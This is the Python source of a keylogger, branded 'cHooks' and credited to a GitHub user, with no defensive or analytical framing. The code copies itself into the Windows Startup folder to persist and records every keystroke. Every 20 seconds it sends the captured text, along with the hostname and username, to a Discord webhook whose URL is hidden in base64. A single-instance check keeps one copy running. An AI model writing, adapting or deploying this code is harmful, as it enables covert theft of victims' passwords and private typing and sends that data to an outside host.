import os
import sys
import asyncio
import keyboard
import socket
import requests
import base64
import psutil
import shutil
from discord import Embed


WEBHOOK_64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzODc4NzMzMTIxNDY5MjQ2My9RM1VtbVh6RFZCMndnMExkelEyMklneGhJM1JIdlo3bXU0cHVZWXMxeElacTlnd3FsZUpiMHI3TlNkUWVNa0lIZXFqaA=="
SECRET = base64.b64decode(WEBHOOK_64).decode()

class NTStartUp:
    def __init__(self):
        self.startup_loc = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
    def startup(self):
        try:
            shutil.copy2(sys.argv[0], self.startup_loc)
        except Exception:
            pass
    
    key_buffer = []

    def on_key_press(self, event):
        if event.name == 'space':
            self.key_buffer.append(' ')
        elif event.name == 'backspace':
            if self.key_buffer:
                self.key_buffer.pop()
        else:
            self.key_buffer.append(event.name)


    def start_logging(self):
        keyboard.on_press(self.on_key_press)

    async def send_keys_to_discord(self):
        while True:
            await asyncio.sleep(20)
            if self.key_buffer:
                keys = ''.join([key for key in self.key_buffer if key != 'space'])
                embed = Embed(
                    title=f'cHooks™ | {hostname} ({username})',
                    description=f'***Keys Logged**:* {keys}',
                    color=0x6c26d4
                )
                embed.set_footer(text="💜 Made by github.com/AWeirDKiD")
                data = {'embeds': [embed.to_dict()]}
                requests.post(SECRET, json=data)
                self.key_buffer = []


    async def main(self):
        def check_process_running():
            current_pid = os.getpid()
            process_count = 0
            for process in psutil.process_iter(['pid', 'name']):
                if process.info['name'].lower() == os.path.basename(sys.executable):
                    if process.info['pid'] != current_pid:
                        process_count += 1
            return process_count

        if check_process_running() > 1:
            os._exit(0)

        embed = Embed(title=f'cHooks™ | {hostname} ({username})', description='Session started!', color=0x0cc444)
        embed.set_footer(text="💚 Made by github.com/AWeirDKiD")
        data = {'embeds': [embed.to_dict()]}
        requests.post(SECRET, json=data)

        self.start_logging()
        await self.send_keys_to_discord()

if __name__ == '__main__':
    logkeys = NTStartUp()
    logkeys.startup()
    username = os.getlogin()
    hostname = socket.gethostname()
    asyncio.run(logkeys.main())
